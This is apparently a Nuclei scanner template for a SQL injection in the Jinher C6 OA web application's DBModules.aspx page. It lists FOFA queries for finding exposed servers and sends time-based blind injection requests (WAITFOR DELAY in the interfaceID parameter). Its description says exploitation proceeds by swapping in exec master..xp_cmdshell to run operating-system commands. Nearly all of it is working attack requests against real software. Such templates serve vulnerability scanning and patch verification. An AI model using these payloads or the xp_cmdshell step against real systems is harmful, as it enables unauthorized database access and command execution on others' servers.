id: jinher-c6-DBModules-sqli

info:
  tags: jinher-c6-DBModules-sqli
  name: jinher-c6-DBModules-sqli
  author: xc
  severity: critical
  description: |
    FOFA: app="金和网络-金和OA" 
    FOFA: body="src=\"/c6/WebResource.axd"
    利用直接修改sql语句为 exec master..xp_cmdshell 'ipconfig'

http:
  - raw:
      - |
        GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

      - |
        GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:10'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36


    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=7'  
          - 'duration_2>=10 && duration_2<=11'
